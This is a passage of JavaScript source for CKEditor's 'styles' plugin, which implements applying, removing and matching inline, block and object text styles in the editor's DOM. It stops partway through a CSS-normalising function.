/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.plugins.add( 'styles',
{
	requires : [ 'selection' ]
});

/**
 * Registers a function to be called whenever a style changes its state in the
 * editing area. The current state is passed to the function. The possible
 * states are {@link CKEDITOR.TRISTATE_ON} and {@link CKEDITOR.TRISTATE_OFF}.
 * @param {CKEDITOR.style} The style to be watched.
 * @param {Function} The function to be called when the style state changes.
 * @example
 * // Create a style object for the &lt;b&gt; element.
 * var style = new CKEDITOR.style( { element : 'b' } );
 * var editor = CKEDITOR.instances.editor1;
 * editor.attachStyleStateChange( style, function( state )
 *     {
 *         if ( state == CKEDITOR.TRISTATE_ON )
 *             alert( 'The current state for the B element is ON' );
 *         else
 *             alert( 'The current state for the B element is OFF' );
 *     });
 */
CKEDITOR.editor.prototype.attachStyleStateChange = function( style, callback )
{
	// Try to get the list of attached callbacks.
	var styleStateChangeCallbacks = this._.styleStateChangeCallbacks;

	// If it doesn't exist, it means this is the first call. So, let's create
	// all the structure to manage the style checks and the callback calls.
	if ( !styleStateChangeCallbacks )
	{
		// Create the callbacks array.
		styleStateChangeCallbacks = this._.styleStateChangeCallbacks = [];

		// Attach to the selectionChange event, so we can check the styles at
		// that point.
		this.on( 'selectionChange', function( ev )
			{
				// Loop throw all registered callbacks.
				for ( var i = 0 ; i < styleStateChangeCallbacks.length ; i++ )
				{
					var callback = styleStateChangeCallbacks[ i ];

					// Check the current state for the style defined for that
					// callback.
					var currentState = callback.style.checkActive( ev.data.path ) ? CKEDITOR.TRISTATE_ON : CKEDITOR.TRISTATE_OFF;

					// If the state changed since the last check.
					if ( callback.state !== currentState )
					{
						// Call the callback function, passing the current
						// state to it.
						callback.fn.call( this, currentState );

						// Save the current state, so it can be compared next
						// time.
						callback.state !== currentState;
					}
				}
			});
	}

	// Save the callback info, so it can be checked on the next occurence of
	// selectionChange.
	styleStateChangeCallbacks.push( { style : style, fn : callback } );
};

CKEDITOR.STYLE_BLOCK = 1;
CKEDITOR.STYLE_INLINE = 2;
CKEDITOR.STYLE_OBJECT = 3;

(function()
{
	var blockElements	= { address:1,div:1,h1:1,h2:1,h3:1,h4:1,h5:1,h6:1,p:1,pre:1 };
	var objectElements	= { a:1,embed:1,hr:1,img:1,li:1,object:1,ol:1,table:1,td:1,tr:1,ul:1 };

	var semicolonFixRegex = /\s*(?:;\s*|$)/;

	CKEDITOR.style = function( styleDefinition, variablesValues )
	{
		if ( variablesValues )
		{
			styleDefinition = CKEDITOR.tools.clone( styleDefinition );

			replaceVariables( styleDefinition.attributes, variablesValues );
			replaceVariables( styleDefinition.styles, variablesValues );
		}

		var element = this.element = ( styleDefinition.element || '*' ).toLowerCase();

		this.type =
			( element == '#' || blockElements[ element ] ) ?
				CKEDITOR.STYLE_BLOCK
			: objectElements[ element ] ?
				CKEDITOR.STYLE_OBJECT
			:
				CKEDITOR.STYLE_INLINE;

		this._ =
		{
			definition : styleDefinition
		};
	};

	CKEDITOR.style.prototype =
	{
		apply : function( document )
		{
			applyStyle.call( this, document, false );
		},

		remove : function( document )
		{
			applyStyle.call( this, document, true );
		},

		applyToRange : function( range )
		{
			return ( this.applyToRange =
						this.type == CKEDITOR.STYLE_INLINE ?
							applyInlineStyle
						: this.type == CKEDITOR.STYLE_BLOCK ?
							applyBlockStyle
						: null ).call( this, range );
		},

		removeFromRange : function( range )
		{
			return ( this.removeFromRange =
						this.type == CKEDITOR.STYLE_INLINE ?
							removeInlineStyle
						: null ).call( this, range );
		},

		applyToObject : function( element )
		{
			setupElement( element, this );
		},

		/**
		 * Get the style state inside an element path. Returns "true" if the
		 * element is active in the path.
		 */
		checkActive : function( elementPath )
		{
			switch ( this.type )
			{
				case CKEDITOR.STYLE_BLOCK :
					return this.checkElementRemovable( elementPath.block || elementPath.blockLimit, true );

				case CKEDITOR.STYLE_INLINE :

					var elements = elementPath.elements;

					for ( var i = 0, element ; i < elements.length ; i++ )
					{
						element = elements[i];

						if ( element == elementPath.block || element == elementPath.blockLimit )
							continue;

						if ( this.checkElementRemovable( element, true ) )
							return true;
					}
			}
			return false;
		},

		// Checks if an element, or any of its attributes, is removable by the
		// current style definition.
		checkElementRemovable : function( element, fullMatch )
		{
			if ( !element )
				return false;

			var def = this._.definition,
				attribs;

			// If the element name is the same as the style name.
			if ( element.getName() == this.element )
			{
				// If no attributes are defined in the element.
				if ( !fullMatch && !element.hasAttributes() )
					return true;

				attribs = getAttributesForComparison( def );

				if ( attribs._length )
				{
					for ( var attName in attribs )
					{
						if ( attName == '_length' )
							continue;

						var elementAttr = element.getAttribute( attName ) || '';
						if ( attribs[ attName ] ==
							 ( attName == 'style' ?
							   normalizeCssText( elementAttr, false ) : elementAttr  ) )
						{
							if ( !fullMatch )
								return true;
						}
						else if ( fullMatch )
								return false;
					}
					if( fullMatch )
						return true;
				}
				else
					return true;
			}

			// Check if the element can be somehow overriden.
			var override = getOverrides( this )[ element.getName() ] ;
			if ( override )
			{
				// If no attributes have been defined, remove the element.
				if ( !( attribs = override.attributes ) )
					return true;

				for ( var i = 0 ; i < attribs.length ; i++ )
				{
					attName = attribs[i][0];
					var actualAttrValue = element.getAttribute( attName );
					if ( actualAttrValue )
					{
						var attValue = attribs[i][1];

						// Remove the attribute if:
						//    - The override definition value is null;
						//    - The override definition value is a string that
						//      matches the attribute value exactly.
						//    - The override definition value is a regex that
						//      has matches in the attribute value.
						if ( attValue === null ||
								( typeof attValue == 'string' && actualAttrValue == attValue ) ||
								attValue.test( actualAttrValue ) )
							return true;
					}
				}
			}
			return false;
		}
	};

	// Build the cssText based on the styles definition.
	CKEDITOR.style.getStyleText = function( styleDefinition )
	{
		// If we have already computed it, just return it.
		var stylesDef = styleDefinition._ST;
		if ( stylesDef )
			return stylesDef;

		stylesDef = styleDefinition.styles;

		// Builds the StyleText.

		var stylesText = ( styleDefinition.attributes && styleDefinition.attributes[ 'style' ] ) || '';

		if ( stylesText.length )
			stylesText = stylesText.replace( semicolonFixRegex, ';' );

		for ( var style in stylesDef )
			stylesText += ( style + ':' + stylesDef[ style ] ).replace( semicolonFixRegex, ';' );

		// Browsers make some changes to the style when applying them. So, here
		// we normalize it to the browser format.
		if ( stylesText.length )
			stylesText = normalizeCssText( stylesText );

		// Return it, saving it to the next request.
		return ( styleDefinition._ST = stylesText );
	};

	function applyInlineStyle( range )
	{
		var document = range.document;

		if ( range.collapsed )
		{
			// Create the element to be inserted in the DOM.
			var collapsedElement = getElement( this, document );

			// Insert the empty element into the DOM at the range position.
			range.insertNode( collapsedElement );

			// Place the selection right inside the empty element.
			range.moveToPosition( collapsedElement, CKEDITOR.POSITION_BEFORE_END );

			return;
		}

		var elementName = this.element;
		var def = this._.definition;
		var isUnknownElement;

		// Get the DTD definition for the element. Defaults to "span".
		var dtd = CKEDITOR.dtd[ elementName ] || ( isUnknownElement = true, CKEDITOR.dtd.span );

		// Bookmark the range so we can re-select it after processing.
		var bookmark = range.createBookmark();

		// Expand the range.
		range.enlarge( CKEDITOR.ENLARGE_ELEMENT );
		range.trim();

		// Get the first node to be processed and the last, which concludes the
		// processing.
		var boundaryNodes = range.getBoundaryNodes();
		var firstNode = boundaryNodes.startNode;
		var lastNode = boundaryNodes.endNode.getNextSourceNode( true );

		// Probably the document end is reached, we need a marker node.
		if ( !lastNode )
		{
				var marker;
				lastNode = marker = document.createText( '' );
				lastNode.insertAfter( range.endContainer );
		}
		// The detection algorithm below skips the contents inside bookmark nodes, so
		// we'll need to make sure lastNode isn't the &nbsp; inside a bookmark node.
		var lastParent = lastNode.getParent();
		if ( lastParent && lastParent.getAttribute( '_fck_bookmark' ) )
			lastNode = lastParent;

		if ( lastNode.equals( firstNode ) )
		{
			// If the last node is the same as the the first one, we must move
			// it to the next one, otherwise the first one will not be
			// processed.
			lastNode = lastNode.getNextSourceNode( true );

			// It may happen that there are no more nodes after it (the end of
			// the document), so we must add something there to make our code
			// simpler.
			if ( !lastNode )
			{
				lastNode = marker = document.createText( '' );
				lastNode.insertAfter( firstNode );
			}
		}

		var currentNode = firstNode;

		var styleRange;

		// Indicates that that some useful inline content has been found, so
		// the style should be applied.
		var hasContents;

		while ( currentNode )
		{
			var applyStyle = false;

			if ( currentNode.equals( lastNode ) )
			{
				currentNode = null;
				applyStyle = true;
			}
			else
			{
				var nodeType = currentNode.type;
				var nodeName = nodeType == CKEDITOR.NODE_ELEMENT ? currentNode.getName() : null;

				if ( nodeName && currentNode.getAttribute( '_fck_bookmark' ) )
				{
					currentNode = currentNode.getNextSourceNode( true );
					continue;
				}

				// Check if the current node can be a child of the style element.
				if ( !nodeName || ( dtd[ nodeName ] && ( currentNode.getPosition( lastNode ) | CKEDITOR.POSITION_PRECEDING | CKEDITOR.POSITION_IDENTICAL | CKEDITOR.POSITION_IS_CONTAINED ) == ( CKEDITOR.POSITION_PRECEDING + CKEDITOR.POSITION_IDENTICAL + CKEDITOR.POSITION_IS_CONTAINED ) ) )
				{
					var currentParent = currentNode.getParent();

					// Check if the style element can be a child of the current
					// node parent or if the element is not defined in the DTD.
					if ( currentParent && ( ( currentParent.getDtd() || CKEDITOR.dtd.span )[ elementName ] || isUnknownElement ) )
					{
						// This node will be part of our range, so if it has not
						// been started, place its start right before the node.
						// In the case of an element node, it will be included
						// only if it is entirely inside the range.
						if ( !styleRange && ( !nodeName || !CKEDITOR.dtd.$removeEmpty[ nodeName ] || ( currentNode.getPosition( lastNode ) | CKEDITOR.POSITION_PRECEDING | CKEDITOR.POSITION_IDENTICAL | CKEDITOR.POSITION_IS_CONTAINED ) == ( CKEDITOR.POSITION_PRECEDING + CKEDITOR.POSITION_IDENTICAL + CKEDITOR.POSITION_IS_CONTAINED ) ) )
						{
							styleRange = new CKEDITOR.dom.range( document );
							styleRange.setStartBefore( currentNode );
						}

						// Non element nodes, or empty elements can be added
						// completely to the range.
						if ( nodeType == CKEDITOR.NODE_TEXT || ( nodeType == CKEDITOR.NODE_ELEMENT && !currentNode.getChildCount() ) )
						{
							var includedNode = currentNode;
							var parentNode;

							// This node is about to be included completelly, but,
							// if this is the last node in its parent, we must also
							// check if the parent itself can be added completelly
							// to the range.
							while ( !includedNode.$.nextSibling
								&& ( parentNode = includedNode.getParent(), dtd[ parentNode.getName() ] )
								&& ( parentNode.getPosition( firstNode ) | CKEDITOR.POSITION_FOLLOWING | CKEDITOR.POSITION_IDENTICAL | CKEDITOR.POSITION_IS_CONTAINED ) == ( CKEDITOR.POSITION_FOLLOWING + CKEDITOR.POSITION_IDENTICAL + CKEDITOR.POSITION_IS_CONTAINED ) )
							{
								includedNode = parentNode;
							}

							styleRange.setEndAfter( includedNode );

							// If the included node still is the last node in its
							// parent, it means that the parent can't be included
							// in this style DTD, so apply the style immediately.
							if ( !includedNode.$.nextSibling )
								applyStyle = true;

							if ( !hasContents )
								hasContents = ( nodeType != CKEDITOR.NODE_TEXT || (/[^\s\ufeff]/).test( currentNode.getText() ) );
						}
					}
					else
						applyStyle = true;
				}
				else
					applyStyle = true;

				// Get the next node to be processed.
				currentNode = currentNode.getNextSourceNode();
			}

			// Apply the style if we have something to which apply it.
			if ( applyStyle && hasContents && styleRange && !styleRange.collapsed )
			{
				// Build the style element, based on the style object definition.
				var styleNode = getElement( this, document );

				// Get the element that holds the entire range.
				var parent = styleRange.getCommonAncestor();

				// Loop through the parents, removing the redundant attributes
				// from the element to be applied.
				while ( styleNode && parent )
				{
					if ( parent.getName() == elementName )
					{
						for ( var attName in def.attributes )
						{
							if ( styleNode.getAttribute( attName ) == parent.getAttribute( attName ) )
								styleNode.removeAttribute( attName );
						}

						for ( var styleName in def.styles )
						{
							if ( styleNode.getStyle( styleName ) == parent.getStyle( styleName ) )
								styleNode.removeStyle( styleName );
						}

						if ( !styleNode.hasAttributes() )
						{
							styleNode = null;
							break;
						}
					}

					parent = parent.getParent();
				}

				if ( styleNode )
				{
					// Move the contents of the range to the style element.
					styleRange.extractContents().appendTo( styleNode );

					// Here we do some cleanup, removing all duplicated
					// elements from the style element.
					removeFromInsideElement( this, styleNode );

					// Insert it into the range position (it is collapsed after
					// extractContents.
					styleRange.insertNode( styleNode );

					// Let's merge our new style with its neighbors, if possible.
					mergeSiblings( styleNode );

					// As the style system breaks text nodes constantly, let's normalize
					// things for performance.
					// With IE, some paragraphs get broken when calling normalize()
					// repeatedly. Also, for IE, we must normalize body, not documentElement.
					// IE is also known for having a "crash effect" with normalize().
					// We should try to normalize with IE too in some way, somewhere.
					if ( !CKEDITOR.env.ie )
						styleNode.$.normalize();
				}

				// Style applied, let's release the range, so it gets
				// re-initialization in the next loop.
				styleRange = null;
			}
		}

		// Remove the temporary marking node.(#4111)
		marker && marker.remove();
		range.moveToBookmark( bookmark );
	}

	function removeInlineStyle( range )
	{
		/*
		 * Make sure our range has included all "collpased" parent inline nodes so
		 * that our operation logic can be simpler.
		 */
		range.enlarge( CKEDITOR.ENLARGE_ELEMENT );

		var bookmark = range.createBookmark(),
			startNode = bookmark.startNode;

		if ( range.collapsed )
		{

			var startPath = new CKEDITOR.dom.elementPath( startNode.getParent() ),
				// The topmost element in elementspatch which we should jump out of.
				boundaryElement;


			for ( var i = 0, element ; i < startPath.elements.length
					&& ( element = startPath.elements[i] ) ; i++ )
			{
				/*
				 * 1. If it's collaped inside text nodes, try to remove the style from the whole element.
				 *
				 * 2. Otherwise if it's collapsed on element boundaries, moving the selection
				 *  outside the styles instead of removing the whole tag,
				 *  also make sure other inner styles were well preserverd.(#3309)
				 */
				if ( element == startPath.block || element == startPath.blockLimit )
					break;

				if ( this.checkElementRemovable( element ) )
				{
					var endOfElement = range.checkBoundaryOfElement( element, CKEDITOR.END ),
							startOfElement = !endOfElement && range.checkBoundaryOfElement( element, CKEDITOR.START );
					if ( startOfElement || endOfElement )
					{
						boundaryElement = element;
						boundaryElement.match = startOfElement ? 'start' : 'end';
					}
					else
					{
						/*
						 * Before removing the style node, there may be a sibling to the style node
						 * that's exactly the same to the one to be removed. To the user, it makes
						 * no difference that they're separate entities in the DOM tree. So, merge
						 * them before removal.
						 */
						mergeSiblings( element );
						removeFromElement( this, element );

					}
				}
			}

			// Re-create the style tree after/before the boundary element,
			// the replication start from bookmark start node to define the
			// new range.
			if ( boundaryElement )
			{
				var clonedElement = startNode;
				for ( i = 0 ;; i++ )
				{
					var newElement = startPath.elements[ i ];
					if ( newElement.equals( boundaryElement ) )
						break;
					// Avoid copying any matched element.
					else if( newElement.match )
						continue;
					else
						newElement = newElement.clone();
					newElement.append( clonedElement );
					clonedElement = newElement;
				}
				clonedElement[ boundaryElement.match == 'start' ?
							'insertBefore' : 'insertAfter' ]( boundaryElement );
			}
		}
		else
		{
			/*
			 * Now our range isn't collapsed. Lets walk from the start node to the end
			 * node via DFS and remove the styles one-by-one.
			 */
			var endNode = bookmark.endNode,
				me = this;

			/*
			 * Find out the style ancestor that needs to be broken down at startNode
			 * and endNode.
			 */
			function breakNodes()
			{
				var startPath = new CKEDITOR.dom.elementPath( startNode.getParent() ),
					endPath = new CKEDITOR.dom.elementPath( endNode.getParent() ),
					breakStart = null,
					breakEnd = null;
				for ( var i = 0 ; i < startPath.elements.length ; i++ )
				{
					var element = startPath.elements[ i ];

					if ( element == startPath.block || element == startPath.blockLimit )
						break;

					if ( me.checkElementRemovable( element ) )
						breakStart = element;
				}
				for ( i = 0 ; i < endPath.elements.length ; i++ )
				{
					element = endPath.elements[ i ];

					if ( element == endPath.block || element == endPath.blockLimit )
						break;

					if ( me.checkElementRemovable( element ) )
						breakEnd = element;
				}

				if ( breakEnd )
					endNode.breakParent( breakEnd );
				if ( breakStart )
					startNode.breakParent( breakStart );
			}
			breakNodes();

			// Now, do the DFS walk.
			var currentNode = startNode.getNext();
			while ( !currentNode.equals( endNode ) )
			{
				/*
				 * Need to get the next node first because removeFromElement() can remove
				 * the current node from DOM tree.
				 */
				var nextNode = currentNode.getNextSourceNode();
				if ( currentNode.type == CKEDITOR.NODE_ELEMENT && this.checkElementRemovable( currentNode ) )
				{
					// Remove style from element or overriding element.
					if( currentNode.getName() == this.element )
						removeFromElement( this, currentNode );
					else
						removeOverrides( currentNode, getOverrides( this )[ currentNode.getName() ] );

					/*
					 * removeFromElement() may have merged the next node with something before
					 * the startNode via mergeSiblings(). In that case, the nextNode would
					 * contain startNode and we'll have to call breakNodes() again and also
					 * reassign the nextNode to something after startNode.
					 */
					if ( nextNode.type == CKEDITOR.NODE_ELEMENT && nextNode.contains( startNode ) )
					{
						breakNodes();
						nextNode = startNode.getNext();
					}
				}
				currentNode = nextNode;
			}
		}

		range.moveToBookmark( bookmark );
}

	function applyBlockStyle( range )
	{
		// Serializible bookmarks is needed here since
		// elements may be merged.
		var bookmark = range.createBookmark( true );

		var iterator = range.createIterator();
		iterator.enforceRealBlocks = true;

		var block;
		var doc = range.document;
		var previousPreBlock;

		while( ( block = iterator.getNextParagraph() ) )		// Only one =
		{
			var newBlock = getElement( this, doc );
			replaceBlock( block, newBlock );
		}

		range.moveToBookmark( bookmark );
	}

	// Replace the original block with new one, with special treatment
	// for <pre> blocks to make sure content format is well preserved, and merging/splitting adjacent
	// when necessary.(#3188)
	function replaceBlock( block, newBlock )
	{
		var newBlockIsPre	= newBlock.is( 'pre' );
		var blockIsPre		= block.is( 'pre' );

		var isToPre	= newBlockIsPre && !blockIsPre;
		var isFromPre	= !newBlockIsPre && blockIsPre;

		if ( isToPre )
			newBlock = toPre( block, newBlock );
		else if ( isFromPre )
			// Split big <pre> into pieces before start to convert.
			newBlock = fromPres( splitIntoPres( block ), newBlock );
		else
			block.moveChildren( newBlock );

		newBlock.replace( block );

		if ( newBlockIsPre )
		{
			// Merge previous <pre> blocks.
			mergePre( newBlock );
		}
	}

	/**
	 * Merge a <pre> block with a previous sibling if available.
	 */
	function mergePre( preBlock )
	{
		var previousBlock;
		if ( !( ( previousBlock = preBlock.getPreviousSourceNode( true, CKEDITOR.NODE_ELEMENT ) )
				 && previousBlock.is
				 && previousBlock.is( 'pre') ) )
			return;

		// Merge the previous <pre> block contents into the current <pre>
		// block.
		//
		// Another thing to be careful here is that currentBlock might contain
		// a '\n' at the beginning, and previousBlock might contain a '\n'
		// towards the end. These new lines are not normally displayed but they
		// become visible after merging.
		var mergedHtml = replace( previousBlock.getHtml(), /\n$/, '' ) + '\n\n' +
				replace( preBlock.getHtml(), /^\n/, '' ) ;

		// Krugle: IE normalizes innerHTML from <pre>, breaking whitespaces.
		if ( CKEDITOR.env.ie )
			preBlock.$.outerHTML = '<pre>' + mergedHtml + '</pre>';
		else
			preBlock.setHtml( mergedHtml );

		previousBlock.remove();
	}

	/**
	 * Split into multiple <pre> blocks separated by double line-break.
	 * @param preBlock
	 */
	function splitIntoPres( preBlock )
	{
		// Exclude the ones at header OR at tail,
		// and ignore bookmark content between them.
		var duoBrRegex = /(\S\s*)\n(?:\s|(<span[^>]+_fck_bookmark.*?\/span>))*\n(?!$)/gi,
			blockName = preBlock.getName(),
			splitedHtml = replace( preBlock.getOuterHtml(),
				duoBrRegex,
				function( match, charBefore, bookmark )
				{
				  return charBefore + '</pre>' + bookmark + '<pre>';
				} );

		var pres = [];
		splitedHtml.replace( /<pre>([\s\S]*?)<\/pre>/gi, function( match, preContent ){
			pres.push( preContent );
		} );
		return pres;
	}

	// Wrapper function of String::replace without considering of head/tail bookmarks nodes.
	function replace( str, regexp, replacement )
	{
		var headBookmark = '',
			tailBookmark = '';

		str = str.replace( /(^<span[^>]+_fck_bookmark.*?\/span>)|(<span[^>]+_fck_bookmark.*?\/span>$)/gi,
			function( str, m1, m2 ){
					m1 && ( headBookmark = m1 );
					m2 && ( tailBookmark = m2 );
				return '';
			} );
		return headBookmark + str.replace( regexp, replacement ) + tailBookmark;
	}
	/**
	 * Converting a list of <pre> into blocks with format well preserved.
	 */
	function fromPres( preHtmls, newBlock )
	{
		var docFrag = new CKEDITOR.dom.documentFragment( newBlock.getDocument() );
		for ( var i = 0 ; i < preHtmls.length ; i++ )
		{
			var blockHtml = preHtmls[ i ];

			// 1. Trim the first and last line-breaks immediately after and before <pre>,
			// they're not visible.
			 blockHtml =  blockHtml.replace( /(\r\n|\r)/g, '\n' ) ;
			 blockHtml = replace(  blockHtml, /^[ \t]*\n/, '' ) ;
			 blockHtml = replace(  blockHtml, /\n$/, '' ) ;
			// 2. Convert spaces or tabs at the beginning or at the end to &nbsp;
			 blockHtml = replace(  blockHtml, /^[ \t]+|[ \t]+$/g, function( match, offset, s )
					{
						if ( match.length == 1 )	// one space, preserve it
							return '&nbsp;' ;
						else if ( !offset )		// beginning of block
							return CKEDITOR.tools.repeat( '&nbsp;', match.length - 1 ) + ' ';
						else				// end of block
							return ' ' + CKEDITOR.tools.repeat( '&nbsp;', match.length - 1 );
					} ) ;

			// 3. Convert \n to <BR>.
			// 4. Convert contiguous (i.e. non-singular) spaces or tabs to &nbsp;
			 blockHtml =  blockHtml.replace( /\n/g, '<br>' ) ;
			 blockHtml =  blockHtml.replace( /[ \t]{2,}/g,
					function ( match )
					{
						return CKEDITOR.tools.repeat( '&nbsp;', match.length - 1 ) + ' ' ;
					} ) ;

			var newBlockClone = newBlock.clone();
			newBlockClone.setHtml(  blockHtml );
			docFrag.append( newBlockClone );
		}
		return docFrag;
	}

	/**
	 * Converting from a non-PRE block to a PRE block in formatting operations.
	 */
	function toPre( block, newBlock )
	{
		// First trim the block content.
		var preHtml = block.getHtml();

		// 1. Trim head/tail spaces, they're not visible.
		preHtml = replace( preHtml, /(?:^[ \t\n\r]+)|(?:[ \t\n\r]+$)/g, '' );
		// 2. Delete ANSI whitespaces immediately before and after <BR> because
		//    they are not visible.
		preHtml = preHtml.replace( /[ \t\r\n]*(<br[^>]*>)[ \t\r\n]*/gi, '$1' );
		// 3. Compress other ANSI whitespaces since they're only visible as one
		//    single space previously.
		// 4. Convert &nbsp; to spaces since &nbsp; is no longer needed in <PRE>.
		preHtml = preHtml.replace( /([ \t\n\r]+|&nbsp;)/g, ' ' );
		// 5. Convert any <BR /> to \n. This must not be done earlier because
		//    the \n would then get compressed.
		preHtml = preHtml.replace( /<br\b[^>]*>/gi, '\n' );

		// Krugle: IE normalizes innerHTML to <pre>, breaking whitespaces.
		if ( CKEDITOR.env.ie )
		{
			var temp = block.getDocument().createElement( 'div' );
			temp.append( newBlock );
			newBlock.$.outerHTML =  '<pre>' + preHtml + '</pre>';
			newBlock = temp.getFirst().remove();
		}
		else
			newBlock.setHtml( preHtml );

		return newBlock;
	}

	// Removes a style from an element itself, don't care about its subtree.
	function removeFromElement( style, element )
	{
		var def = style._.definition,
			attributes = def.attributes,
			styles = def.styles,
			overrides = getOverrides( style );

		function removeAttrs()
		{
			for ( var attName in attributes )
			{
				// The 'class' element value must match (#1318).
				if ( attName == 'class' && element.getAttribute( attName ) != attributes[ attName ] )
					continue;
				element.removeAttribute( attName );
			}
		}

		// Remove definition attributes/style from the elemnt.
		removeAttrs();
		for ( var styleName in styles )
			element.removeStyle( styleName );

		// Now remove override styles on the element.
		attributes = overrides[ element.getName() ];
		if( attributes )
			removeAttrs();
		removeNoAttribsElement( element );
	}

	// Removes a style from inside an element.
	function removeFromInsideElement( style, element )
	{
		var def = style._.definition,
			attribs = def.attributes,
			styles = def.styles,
			overrides = getOverrides( style );

		var innerElements = element.getElementsByTag( style.element );

		for ( var i = innerElements.count(); --i >= 0 ; )
			removeFromElement( style,  innerElements.getItem( i ) );

		// Now remove any other element with different name that is
		// defined to be overriden.
		for ( var overrideElement in overrides )
		{
			if ( overrideElement != style.element )
			{
				innerElements = element.getElementsByTag( overrideElement ) ;
				for ( i = innerElements.count() - 1 ; i >= 0 ; i-- )
				{
					var innerElement = innerElements.getItem( i );
					removeOverrides( innerElement, overrides[ overrideElement ] ) ;
				}
			}
		}

	}

	/**
	 *  Remove overriding styles/attributes from the specific element.
	 *  Note: Remove the element if no attributes remain.
	 * @param {Object} element
	 * @param {Object} overrides
	 */
	function removeOverrides( element, overrides )
	{
		var attributes = overrides && overrides.attributes ;

		if ( attributes )
		{
			for ( var i = 0 ; i < attributes.length ; i++ )
			{
				var attName = attributes[i][0], actualAttrValue ;

				if ( ( actualAttrValue = element.getAttribute( attName ) ) )
				{
					var attValue = attributes[i][1] ;

					// Remove the attribute if:
					//    - The override definition value is null ;
					//    - The override definition valie is a string that
					//      matches the attribute value exactly.
					//    - The override definition value is a regex that
					//      has matches in the attribute value.
					if ( attValue === null ||
							( attValue.test && attValue.test( actualAttrValue ) ) ||
							( typeof attValue == 'string' && actualAttrValue == attValue ) )
						element.removeAttribute( attName ) ;
				}
			}
		}

		removeNoAttribsElement( element );
	}

	// If the element has no more attributes, remove it.
	function removeNoAttribsElement( element )
	{
		// If no more attributes remained in the element, remove it,
		// leaving its children.
		if ( !element.hasAttributes() )
		{
			// Removing elements may open points where merging is possible,
			// so let's cache the first and last nodes for later checking.
			var firstChild	= element.getFirst();
			var lastChild	= element.getLast();

			element.remove( true );

			if ( firstChild )
			{
				// Check the cached nodes for merging.
				mergeSiblings( firstChild );

				if ( lastChild && !firstChild.equals( lastChild ) )
					mergeSiblings( lastChild );
			}
		}
	}

	function mergeSiblings( element )
	{
		if ( !element || element.type != CKEDITOR.NODE_ELEMENT || !CKEDITOR.dtd.$removeEmpty[ element.getName() ] )
			return;

		mergeElements( element, element.getNext(), true );
		mergeElements( element, element.getPrevious() );
	}

	function mergeElements( element, sibling, isNext )
	{
		if ( sibling && sibling.type == CKEDITOR.NODE_ELEMENT )
		{
			var hasBookmark = sibling.getAttribute( '_fck_bookmark' );

			if ( hasBookmark )
				sibling = isNext ? sibling.getNext() : sibling.getPrevious();

			if ( sibling && sibling.type == CKEDITOR.NODE_ELEMENT && element.isIdentical( sibling ) )
			{
				// Save the last child to be checked too, to merge things like
				// <b><i></i></b><b><i></i></b> => <b><i></i></b>
				var innerSibling = isNext ? element.getLast() : element.getFirst();

				if ( hasBookmark )
					( isNext ? sibling.getPrevious() : sibling.getNext() ).move( element, !isNext );

				sibling.moveChildren( element, !isNext );
				sibling.remove();

				// Now check the last inner child (see two comments above).
				if ( innerSibling )
					mergeSiblings( innerSibling );
			}
		}
	}

	function getElement( style, targetDocument )
	{
		var el;

		var def = style._.definition;

		var elementName = style.element;

		// The "*" element name will always be a span for this function.
		if ( elementName == '*' )
			elementName = 'span';

		// Create the element.
		el = new CKEDITOR.dom.element( elementName, targetDocument );

		return setupElement( el, style );
	}

	function setupElement( el, style )
	{
		var def = style._.definition;
		var attributes = def.attributes;
		var styles = CKEDITOR.style.getStyleText( def );

		// Assign all defined attributes.
		if ( attributes )
		{
			for ( var att in attributes )
			{
				el.setAttribute( att, attributes[ att ] );
			}
		}

		// Assign all defined styles.
		if ( styles )
			el.setAttribute( 'style', styles );

		return el;
	}

	var varRegex = /#\((.+?)\)/g;
	function replaceVariables( list, variablesValues )
	{
		for ( var item in list )
		{
			list[ item ] = list[ item ].replace( varRegex, function( match, varName )
				{
					return variablesValues[ varName ];
				});
		}
	}


	// Returns an object that can be used for style matching comparison.
	// Attributes names and values are all lowercased, and the styles get
	// merged with the style attribute.
	function getAttributesForComparison( styleDefinition )
	{
		// If we have already computed it, just return it.
		var attribs = styleDefinition._AC;
		if ( attribs )
			return attribs;

		attribs = {};

		var length = 0;

		// Loop through all defined attributes.
		var styleAttribs = styleDefinition.attributes;
		if ( styleAttribs )
		{
			for ( var styleAtt in styleAttribs )
			{
				length++;
				attribs[ styleAtt ] = styleAttribs[ styleAtt ];
			}
		}

		// Includes the style definitions.
		var styleText = CKEDITOR.style.getStyleText( styleDefinition );
		if ( styleText )
		{
			if ( !attribs[ 'style' ] )
				length++;
			attribs[ 'style' ] = styleText;
		}

		// Appends the "length" information to the object.
		attribs._length = length;

		// Return it, saving it to the next request.
		return ( styleDefinition._AC = attribs );
	}

	/**
	 * Get the the collection used to compare the elements and attributes,
	 * defined in this style overrides, with other element. All information in
	 * it is lowercased.
	 * @param {CKEDITOR.style} style
	 */
	function getOverrides( style )
	{
		if( style._.overrides )
			return style._.overrides;

		var overrides = ( style._.overrides = {} ),
			definition = style._.definition.overrides;

		if ( definition )
		{
			// The override description can be a string, object or array.
			// Internally, well handle arrays only, so transform it if needed.
			if ( !CKEDITOR.tools.isArray( definition ) )
				definition = [ definition ];

			// Loop through all override definitions.
			for ( var i = 0 ; i < definition.length ; i++ )
			{
				var override = definition[i];
				var elementName;
				var overrideEl;
				var attrs;

				// If can be a string with the element name.
				if ( typeof override == 'string' )
					elementName = override.toLowerCase();
				// Or an object.
				else
				{
					elementName = override.element ? override.element.toLowerCase() : style.element;
					attrs = override.attributes;
				}

				// We can have more than one override definition for the same
				// element name, so we attempt to simply append information to
				// it if it already exists.
				overrideEl = overrides[ elementName ] || ( overrides[ elementName ] = {} );

				if ( attrs )
				{
					// The returning attributes list is an array, because we
					// could have different override definitions for the same
					// attribute name.
					var overrideAttrs = ( overrideEl.attributes = overrideEl.attributes || new Array() );
					for ( var attName in attrs )
					{
						// Each item in the attributes array is also an array,
						// where [0] is the attribute name and [1] is the
						// override value.
						overrideAttrs.push( [ attName.toLowerCase(), attrs[ attName ] ] );
					}
				}
			}
		}

		return overrides;
	}

	function normalizeCssText( unparsedCssText, nativeNormalize )
	{
		var styleText;
		if ( nativeNormalize !== false )
		{
			// Injects the style in a temporary span object, so the browser parses it,
			// retrieving its final format.
			var temp = new CKEDITOR.dom.element( 'span' );
			temp.setAttribute( 'style', unparsedCssText );
			styleText = temp.getAttribute( 'style' );
		}
		else
			styleText = unparsedCssText;

		// Shrinking white-spaces around colon and semi-colon (#4147).
		// Compensate tail semi-colon.
		return styleText.replace( /\s*([;:])\s*/, '$1' )
